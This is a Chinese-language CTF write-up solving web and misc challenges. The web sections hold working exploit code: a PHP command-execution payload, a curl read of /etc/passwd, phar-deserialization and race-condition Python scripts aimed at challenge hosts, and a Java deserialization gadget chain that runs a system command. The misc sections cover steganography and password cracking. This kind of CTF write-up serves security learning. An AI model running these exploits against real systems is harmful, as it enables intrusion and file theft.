0x01 Web
========

warmup-php
----------

利用链：

```php
Action->run()->renderContent()->renderSection()->renderTableBody()-
>renderTableRow()->evaluateExpression()
```

正好练习一下动调，只有一个run方法，下个断点，随便输点东西

![image-20220425082227176](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f5c86d5ade2387a13b09f185abfeecef57e3bf00.png)

定位过去

![image-20220425083537060](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-20eaacb67ca2fe416e0057639947577f731dd19c.png)

然后进入renderContent

![image-20220425083626927](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-09223254efbb444ca1ec62d1d3ea4477bf71efff.png)

这里有一个array($this,'renderSection')，然后程序就结束了，没有涉及到rce的点，但是调用preg\_replace\_callback 回调函数用正则匹配，所以为了进入renderSection 方法，执行了一个无参的方法，所以需要数组，传一个`properties[template]={aaaaa}`，进入renderSection

![image-20220425102849140](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-9d4f4f939f28e04daaf6f3c5f1fd7a15c5e42551.png)

传`properties[template]={TableBody}`进入TableBody

![image-20220425103248455](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5d0ce23ddeb7bb309a11685f23e824b925b24147.png)

这里有个if判断，需要count($data)大于0才能进入tablerow，所以传一个`properties[data]=1`，成功进入：

![image-20220425143740524](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b107b18d459136d003fe80b631df3a5b19783918.png)

搜一下命令执行的地方在base.php的evaluateExpression

![image-20220425082616855](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-9486010cd1f39cce85a3bb2ff906f294a4098285.png)

而这里刚好调用了evaluateExpression，

![image-20220425143847818](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-e490b6cf2154f8e71e313a7f9e098ae962963975.png)

所以

```php
http://127.0.0.1/?action=TestView

POST：
properties[template]={TableBody}&properties[data]=aa&&properties[rowHtmlOptionsExpression]=system('whoami');
```

![image-20220425144137469](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5044c24f6c17b8681ca7915bc0472636748c70c3.png)

soeasy\_php
-----------

给的dockerfile

```dockerfile
FROM php:7.2.3-fpm

COPY files /tmp/files/
COPY src /var/www/html/
COPY flag /flag

RUN chown -R root:root /var/www/html/ && \
    chmod -R 755 /var/www/html && \
    chown -R www-data:www-data /var/www/html/uploads && \
    sed -i 's/deb.debian.org/mirrors.aliyun.com/g' /etc/apt/sources.list && \
    sed -i '/security/d' /etc/apt/sources.list && \
    apt-get update && \
    apt-get install nginx -y && \
    /bin/mv -f /tmp/files/default  /etc/nginx/sites-available/default && \
    gcc /tmp/files/copyflag.c -o /copyflag && \
    chmod 4711 /copyflag && \
    rm -rf /tmp/files && \
    rm -rf /var/lib/apt/lists/* && \
    chmod 700 /flag

CMD nginx&&php-fpm

EXPOSE 80
```

f12看到注释掉的一个更换头像的按钮

![image-20220425150226089](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c218c643cf3c1e6d50eb0f55d49dd32ca0a53ff5.png)

按照form标签的内容，curl

```php
curl http://9163be59-3cfb-4ad3-8037-169bde715f02.node4.buuoj.cn:81/edit.php --data 'png=/etc/passwd&flag='

curl http://9163be59-3cfb-4ad3-8037-169bde715f02.node4.buuoj.cn:81/uploads/head.png
```

![image-20220425150552865](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d4dbbe71cab1b4a5d302d177136aeaae1dba8388.png)

但是读不到flag，尝试读index.php、upload.php、edit.php

index.php

```php
<html>
<body>
当前头像：
<img width="50px" height="50px" src="uploads/head.png"/>
<br/>
<form action="upload.php" method="post" enctype="multipart/form-data">
    <p><input type="file" name="file"></p>
    <p><input type="submit" value="上传头像"></p>
</form>
<br/>
<form action="edit.php" method="post" enctype="application/x-www-form-urlencoded">
    <p><input type="text" name="png" value="<?php echo rand(1,3)?>.png" hidden="1"></p>
    <p><input type="text" name="flag" value="flag{x}" hidden="1"></p>
    <p><input type="submit" value="更换头像"></p>
</form>

</body>
</html>
```

upload.php

```php
<?php
if (!isset($_FILES['file'])) {
    die("请上传头像");
}

$file = $_FILES['file'];
$filename = md5("png".$file['name']).".png";
$path = "uploads/".$filename;
if(move_uploaded_file($file['tmp_name'],$path)){
    echo "上传成功： ".$path;
};
```

edit.php

```php
<?php
ini_set("error_reporting","0");
class flag{
    public function copyflag(){
        exec("/copyflag"); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt
        echo "SFTQL";
    }
    public function __destruct(){
        $this->copyflag();
    }

}

function filewrite($file,$data){
        unlink($file);
        file_put_contents($file, $data);
}

if(isset($_POST['png'])){
    $filename = $_POST['png'];
    if(!preg_match("/:|phar|\/\/|php/im",$filename)){
        $f = fopen($filename,"r");
        $contents = fread($f, filesize($filename));
        if(strpos($contents,"flag") !== false){
            filewrite($filename,"Don't give me flag!!!");
        }
    }

    if(isset($_POST['flag'])) {
        $flag = (string)$_POST['flag'];
        if ($flag == "Give me flag") {
            filewrite("/tmp/flag.txt", "Don't give me flag");
            sleep(2);
            die("no no no !");
        } else {
            filewrite("/tmp/flag.txt", $flag);  //不给我看我自己写个flag。
        }
        $head = "uploads/head.png";
        unlink($head);
        if (symlink($filename, $head)) {
            echo "成功更换头像";
        } else {
            unlink($filename);
            echo "非正常文件，已被删除";
        };
    }

}
```

重点看edit.php：这里有个类并且有\_\_destruct函数，没有unserialize()函数，是phar触发反序列化。触发反序列化后会执行/copyflag ，然后读取flag。这里需要用unlink函数来触发。要触发unlink的前提是symlink链接失败，需要导致symlink返回false的方法。

先构造phar：

```php
<?php
class flag {
}
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new flag();
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

![image-20220425162130269](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b001cae09fdd1452b8dd790721d7a5eca30d7486.png)

### 利用filename超长使symlink执行失败：

一个小知识：只要filename的长度大于4096，symlink就可以执行失败。phar://phar.phar/xxxxx后面的x数量并不会影响反序列化的触发：

```python
import requests

url = "http://9163be59-3cfb-4ad3-8037-169bde715f02.node4.buuoj.cn:81/"
sess = requests.Session()
sess.headers = {"content-type":"application/x-www-form-urlencoded"}
url1 = url + "edit.php"
data = {"png":"phar://uploads/4a355efcd48d8d2a9d1257c937481ddf.png/m*6000","flag":"flag"}
print(sess.post(url1,data).text)
```

![image-20220425171240785](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-a8e82bdb29bc4bdb2208ec1f471ab9423b37c550.png)

发现不行，可能是被覆盖了

![image-20220425162714469](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d4e04d5db0335e50571436c308b3b0de6ad58fa8.png)

继续看代码：

```php
$filename = $_POST['png'];
if(!preg_match("/:|phar|\/\/|php/im",$filename)){
    $f = fopen($filename,"r");
    $contents = fread($f, filesize($filename));
    if(strpos($contents,"flag") !== false){
        filewrite($filename,"Don't give me flag!!!");
    }
```

接下来就可以用竞争度读flag，跟下面这个思路差不多，只不过下面这种思路是顺便通过竞争使symlink失败，脚本也跟下面的差不多，因为`/tmp/flag.txt`会被覆盖，所以要竞争触发phar写flag，然后竞争读，但是这里phar反序列化的触发确实是因为m\*6000，而不是同名返回false，如果去掉是跑不出来的

```php
import requests
import threading
import time

sess = requests.session()

headurl = "http://a635169a-e739-46d3-90e8-f8c1db9eca4c.node4.buuoj.cn:81/uploads/head.png"
editurl = "http://a635169a-e739-46d3-90e8-f8c1db9eca4c.node4.buuoj.cn:81/edit.php"

def symlink():
    sess.post(editurl, data={"png":"/tmp/flag.txt", "flag":""})

if __name__ == "__main__":
    for s in range(20):
        sess.post(editurl, data={"png":"phar://uploads/fe409167fb98b72dcaff5486a612a575.png/m*6000", "flag":""})
        t2 = threading.Thread(target=symlink, args=())
        t2.start()
    while True:
        flag = sess.get(headurl).text
        if "flag" in flag:
            print(flag)
            break
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-9c372b6c1847d15b08ddd3a806faf7c7dc2022ba.png)

### 利用竞争重名使symlink失败：

学到的新思路：`symlink()`不能创建同名链接，所以慢的那个会False  
exp：

```python
import requests
import threading
import time

sess = requests.session()

headurl = "http://a635169a-e739-46d3-90e8-f8c1db9eca4c.node4.buuoj.cn:81/uploads/head.png"
editurl = "http://a635169a-e739-46d3-90e8-f8c1db9eca4c.node4.buuoj.cn:81/edit.php"

def unlink():
    sess.post(editurl, data={"png":"phar://uploads/fe409167fb98b72dcaff5486a612a575.png", "flag":""})

def symlink():
    sess.post(editurl, data={"png":"/tmp/flag.txt", "flag":""})

if __name__ == "__main__":
    for s in range(20):
        t1 = threading.Thread(target=unlink, args=())
        t2 = threading.Thread(target=symlink, args=())
        t1.start()
        t2.start()
    while True:
        flag = sess.get(headurl).text
        if "flag" in flag:
            print(flag)
            break
```

### 利用proc：

预期：

我们可以想到proc目录的妙用，在覆盖文件后proc还会保存，所以我们可以通过读proc来得到flag

```php
if ($flag == "Give me flag") {
    filewrite("/tmp/flag.txt", "Don't give me flag");
    sleep(2);
    die("no no no !");
} 
```

proc中的pid和fd中的x未知。ps -ef查找php-fpm进程，为15-21之间，fd的值均为5或6

得到最终exp

```python
import threading
import time

import requests

url = "http://9163be59-3cfb-4ad3-8037-169bde715f02.node4.buuoj.cn:81/"
sess = requests.Session()
def edit(png,flag):
    editurl = url + "edit.php"
    data = {"png":png,"flag":flag}
    return sess.post(editurl,data).text

pharfile = "uploads/fe409167fb98b72dcaff5486a612a575.png"
print(edit("phar://" + pharfile + "/" + "m" * 4096,"aaa"))

t = threading.Thread(target=edit,args=("/tmp/flag.txt","Give me flag"))
t.start()
for i in range(10,30):
    edit(f"/proc/{str(i)}/fd/5", "a")
    flag = sess.get(url + "uploads/head.png").text
    if "flag{" in flag:
        print(flag)
```

![image-20220425164307502](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-daf90edcff7c5c867695dba0e547f364d507a1bf.png)

warmup-java
-----------

题目给出了 jar 包，在源码中我们可以鲜明的看到利用点，这里有了 InvocationHandler 和 invoke，我们立马就可以想到要利动态代理来进行反序列化的利用了，代理之后利用这里的 invoke 动态加载字节码就可以了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f23a8fa1bec7676d9e3ee8f53d6a291eb2e4d0b1.png)  
要利用的点知道了以后，接下来就是要去找如何进行利用了，这个比较难。作为一个初学者，我对如何找对代理进行利用的点一点想法都没有... 不过，缝合就好了，1.8 版本的 JDK ，我们借鉴 CC4 ，以 PriorityQueue 为入口，在 comparator 类处实现代理。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d81d38ac70897a8aba546e28e5047fa120b39c98.png)  
整体的调用链如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-3cfba2138007b71386fc27f3284ff1fb01e31038.png)  
exp

```php
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.util.*;

public class exp {
    public static class StubTransletPayload extends AbstractTranslet {
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath((new ClassClassPath(StubTransletPayload.class)));
        CtClass clazz = pool.get((StubTransletPayload.class.getName()));
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("sp4c1ous");

        TemplatesImpl tmplates = new TemplatesImpl();
        setFieldValue(tmplates, "_bytecodes", new byte[][] { clazz.toBytecode() });
        setFieldValue(tmplates, "_name", "HelloTemplatesTmpl");
        setFieldValue(tmplates, "_tfactory", new TransformerFactoryImpl());

        Field name=Reflections.getField(tmplates.getClass(),"_name");
        Reflections.setAccessible(name);
        Reflections.setFieldValue(tmplates,"_name","s");
        Reflections.setFieldValue(tmplates, "_tfactory", new TransformerFactoryImpl());

        MyInvocationHandler s = new MyInvocationHandler(Templates.class);

        Comparator  comparator = (Comparator) Proxy.newProxyInstance(exp.class.getClassLoader(), new Class[]{ Comparator.class },s);

        PriorityQueue<Object> queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);

        Object[] queueArray = (Object[])(marshalsec.util.Reflections.getFieldValue(queue, "queue"));
        queueArray[0] = tmplates;

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue, comparator);
        System.out.print(Utils.objectToHexString(queue));

        String data = Utils.objectToHexString(queue);

        new ObjectInputStream(new ByteArrayInputStream(Utils.hexStringToBytes(data))).readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}

```

0x02 Misc
=========

SimpleFlow
----------

蚁剑流量

有个压缩包，但是有密码

![image-20220424202156324](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-e9265bbb7e479e134ee902931a82474c1b2e37ee.png)

找密码：

![image-20220424202414916](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6790d78460c37573e0303ac7e09ae08b85d01d14.png)

密码是PaSsZiPWorD，解密就是flag

![image-20220424202400762](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d23ed68b6db054b40f6a88018207e6b8a2918611.png)

熟悉的猫
----

爆破kdbx

![image-20220425172936110](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6a3496314d52571720a805b8c419cbca6ea02429.png)

得到密码：

![image-20220425173028721](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-0bdf501816d1e6beee52b2efde9a1d48696e9907.png)

hint.txt

![image-20220425173129216](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-fce0500393da4ebc78f4830598b1a110ad185e0c.png)

判断是Tupper自我指涉公式

网上找个脚本改一改

```python
def f(x,y):
    d = ((-22 * x) - (y % 22))
    e = reduce(lambda x,y: x*y, [2 for x in range(-d)]) if d else 1
    f = ((y / 22) / e)
    g = f % 2
    return 0.5 < g
def Tupper_self_referential_formula():
    k = 92898203278702907929705938676672021500394791427205757369123489204565300324859717082409892641951206664564991991489354661871425872649524078000948199832659815275909285198829276929014694628110159824930931595166203271443269827449505707655085842563682060910813942504507936625555735585913273575050118552353192682955310220323463465408645422334101446471078933149287336241772448338428740302833855616421538520769267636119285948674549756604384946996184385407505456168240123319785800909933214695711828013483981731933773017336944656397583872267126767778549745087854794302808950100966582558761224454242018467578959766617176016660101690140279961968740323327369347164623746391335756442566959352876706364265509834319910419399748338894746638758652286771979896573695823608678008814861640308571256880794312652055957150464513950305355055495262375870102898500643010471425931450046440860841589302890250456138060738689526283389256801969190204127358098408264204643882520969704221896973544620102494391269663693407573658064279947688509910028257209987991480259150865283245150325813888942058
    for y in range(k+21, k-1, -1):
        line = ""
        for x in range(0, 160):
            if f(x,y):
                line += "#"
            else:
                line += " "
        print line
if __name__ == '__main__':
    returned = Tupper_self_referential_formula()
    if returned:
        print str(returned)
```

![image-20220425173408439](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6ffb803151d62a5cbe44703c9c1bdecccbdfb6ae.png)

接下来就是cat变换了

```php
import numpy as np
import matplotlib.pyplot
from skimage.io import imread, imshow
import time
import math
import cv2

def arnold_decode(image, shuffle_times, a, b):
    decode_image = np.zeros(shape=image.shape)
    h, w = image.shape[0], image.shape[1]
    N = h # 或N=w
    for time in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):
                new_x = ((a*b+1)*ori_x + (-b)* ori_y)% N
                new_y = ((-a)*ori_x + ori_y) % N
                decode_image[new_x, new_y] = image[ori_x, ori_y]
    cv2.imshow("image",decode_image)
    cv2.waitKey(1000)
    cv2.imwrite('2.png',decode_image)
    return decode_image
aaa = imread('flag.png')
arnold_decode(aaa, 33, 121,144)
```

得到flag

冰墩墩
---

其实很简单，别问为什么没做出来，问就是眼瞎没看start.txt

![image-20220424185742013](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-3187a679d6dca4669263b2b9a6a3efeb9f80af63.png)

```python
f = open('BinDunDun\\BinDunDun\\start.txt','r')
read = f.read()
a = read.split(" ")[0]
doc = read[-14:]
# print(doc)

while True:
    a += read.split(" ")[0]
    doc = read[-14:]
    if 'end.txt' in doc:
        print(a)
    f = open('BinDunDun\\BinDunDun\\'+doc,'r')
    read = f.read()
```

![image-20220424184648464](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-a043fcf32d23c2c6658c5a6dae01eec947ecc92c.png)

转16进制之后发现四不像，但是第一段出来是504b，第二段是304，少个0，所以二级制需要补全16位

```php
f = open('BinDunDun\\BinDunDun\\start.txt','r')
read = f.read()
a = read.split(" ")[0].zfill(16)
doc = read[-14:]
# print(doc)

while True:
    a += read.split(" ")[0].zfill(16)
    doc = read[-14:]
    if 'end.txt' in doc:
        print(a)
    f = open('BinDunDun\\BinDunDun\\'+doc,'r')
    read = f.read()
```

![image-20220424185536715](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d245cf17c06dd6fbf30f7a0dd3085bd1006c0be0.png)

得到

![image-20220424185812004](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d74ebddccc59befe993814f3e688831136cca6b1.png)

一看就是pyc隐写

![image-20220424185931694](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-13f40174f29dd1ad18813e461a829ed9751a6e03.png)

得到：

`BingD@nD@n_in_BeiJing_Winter_Olympics`

另一个文件，修修文件头，是个jpg文件，猜测上面这个是某个隐写的密码，有密码的隐写就那么多，挨个试就行，试到jphhs

![image-20220424190440771](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d436b40bd8a76e4e7b055b8e4f6398dea892a9c4.png)

得到：

![image-20220424190501986](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5903e6b6b54ffaea1e0a086ff58d153e9d30fbe9.png)

![image-20220424190525588](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-48a613878efb659d5552c8fefc64c44bb542ef9e.png)